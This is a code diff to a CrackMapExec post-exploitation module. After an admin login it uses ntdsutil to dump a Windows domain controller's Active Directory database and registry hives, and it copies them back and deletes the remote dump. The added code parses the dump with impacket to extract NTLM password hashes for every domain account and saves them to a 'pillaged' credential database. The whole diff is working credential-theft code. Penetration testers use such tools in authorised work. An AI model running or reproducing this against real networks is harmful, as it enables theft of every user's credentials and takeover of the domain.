@@ -1,5 +1,12 @@
 import os
+import shutil
+import tempfile
 import time
+
+from impacket.examples.secretsdump import LocalOperations, NTDSHashes
+
+from cme.helpers.logger import highlight
+from cme.helpers.misc import validate_ntlm
 
 class CMEModule:
     '''
@@ -18,19 +25,18 @@ class CMEModule:
         Dump NTDS with ntdsutil
         Module by @zblurx
 
-        DIR_RESULT  Local dir to write ntds dump
+        DIR_RESULT  Local dir to write ntds dump. If specified, the local dump will not be deleted after parsing
         '''
         self.share = "ADMIN$"
         self.tmp_dir = "C:\\Windows\\Temp\\"
         self.tmp_share = self.tmp_dir.split("C:\\Windows\\")[1]
         self.dump_location = str(time.time())[:9]
-        self.dir_result = 'ntdsutil'
+        self.dir_result = self.dir_result = tempfile.mkdtemp()
+        self.no_delete = False
 
         if 'DIR_RESULT' in module_options:
-            self.dir_result = module_options['DIR_RESULT']
-
-        pass
-
+            self.dir_result = os.path.abspath(module_options['DIR_RESULT'])
+            self.no_delete = True
 
     def on_admin_login(self, context, connection):
         command = "powershell \"ntdsutil.exe 'ac i ntds' 'ifm' 'create full %s%s' q q\"" % (self.tmp_dir, self.dump_location)
@@ -44,10 +50,9 @@ class CMEModule:
             context.log.error("Error while dumping NTDS")
             return
 
-        if not os.path.isdir(self.dir_result):
-            os.makedirs(self.dir_result, exist_ok=True)
-            os.makedirs(os.path.join(self.dir_result, 'Active Directory'), exist_ok=True)
-            os.makedirs(os.path.join(self.dir_result, 'registry'), exist_ok=True)
+        os.makedirs(self.dir_result, exist_ok=True)
+        os.makedirs(os.path.join(self.dir_result, 'Active Directory'), exist_ok=True)
+        os.makedirs(os.path.join(self.dir_result, 'registry'), exist_ok=True)
 
         context.log.info("Copying NTDS dump to %s" % self.dir_result)
         context.log.debug('Copy ntds.dit to host')
@@ -73,13 +78,70 @@ class CMEModule:
                 context.log.debug('Copied SECURITY file')
             except Exception as e:
                 context.log.error('Error while get SECURITY file: {}'.format(e))
-        context.log.success("NTDS dump copied to %s" % self.dir_result)
+        context.log.info("NTDS dump copied to %s" % self.dir_result)
         try:
             command = "rmdir /s /q %s%s" % (self.tmp_dir, self.dump_location)
             p = connection.execute(command, True)
-            context.log.success('Deleted %s%s dump directory' % (self.tmp_dir, self.dump_location))
+            context.log.success('Deleted %s%s remote dump directory' % (self.tmp_dir, self.dump_location))
         except Exception as e:
-            context.log.error('Error deleting {} directory on share {}: {}'.format(self.dump_location, self.share, e))
+            context.log.error('Error deleting {} remote directory on share {}: {}'.format(self.dump_location, self.share, e))
 
-        context.log.highlight("""Now:
-        secretsdump.py -system %s/registry/SYSTEM -security %s/registry/SECURITY -ntds "%s/Active Directory/ntds.dit" LOCAL"""% (self.dir_result, self.dir_result, self.dir_result))
+        localOperations = LocalOperations("%s/registry/SYSTEM" % self.dir_result)
+        bootKey = localOperations.getBootKey()
+        noLMHash = localOperations.checkNoLMHashPolicy()
+
+        host_id = context.db.get_computers(filterTerm=connection.host)[0][0]
+
+        def add_ntds_hash(ntds_hash, host_id):
+            add_ntds_hash.ntds_hashes += 1
+            if context.enabled:
+                if "Enabled" in ntds_hash:
+                    ntds_hash = ntds_hash.split(" ")[0]
+                    context.log.highlight(ntds_hash)
+            else:
+                ntds_hash = ntds_hash.split(" ")[0]
+                context.log.highlight(ntds_hash)
+            if ntds_hash.find('$') == -1:
+                if ntds_hash.find('\\') != -1:
+                    domain, hash = ntds_hash.split('\\')
+                else:
+                    domain = connection.domain
+                    hash = ntds_hash
+
+                try:
+                    username,_,lmhash,nthash,_,_,_ = hash.split(':')
+                    parsed_hash = ':'.join((lmhash, nthash))
+                    if validate_ntlm(parsed_hash):
+                        context.db.add_credential('hash', domain, username, parsed_hash, pillaged_from=host_id)
+                        add_ntds_hash.added_to_db += 1
+                        return
+                    raise
+                except:
+                    context.log.debug("Dumped hash is not NTLM, not adding to db for now ;)")
+            else:
+                context.log.debug("Dumped hash is a computer account, not adding to db")
+        add_ntds_hash.ntds_hashes = 0
+        add_ntds_hash.added_to_db = 0
+
+        NTDS = NTDSHashes("%s/Active Directory/ntds.dit" % self.dir_result, bootKey, isRemote=False, history=False, noLMHash=noLMHash,
+                        remoteOps=None, useVSSMethod=True, justNTLM=True,
+                        pwdLastSet=False, resumeSession=None, outputFileName=connection.output_filename,
+                        justUser=None, printUserStatus=True,
+                        perSecretCallback = lambda secretType, secret : add_ntds_hash(secret, host_id))
+        
+        try:
+            context.log.success('Dumping the NTDS, this could take a while so go grab a redbull...')
+            NTDS.dump()
+            context.log.success('Dumped {} NTDS hashes to {} of which {} were added to the database'.format(highlight(add_ntds_hash.ntds_hashes), connection.output_filename + '.ntds', highlight(add_ntds_hash.added_to_db)))
+            context.log.info("To extract only enabled accounts from the output file, run the following command: ")
+            context.log.info("grep -iv disabled {} | cut -d ':' -f1".format(connection.output_filename + '.ntds'))
+        except Exception as e:
+            context.log.error(e)
+
+        NTDS.finish()
+        
+        if self.no_delete:
+           context.log.info('Raw NTDS dump copied to %s, parse it with:' % self.dir_result)
+           context.log.info("secretsdump.py -system %s/registry/SYSTEM -security %s/registry/SECURITY -ntds \"%s/Active Directory/ntds.dit\" LOCAL" % (self.dir_result, self.dir_result, self.dir_result))
+        else:
+            shutil.rmtree(self.dir_result)
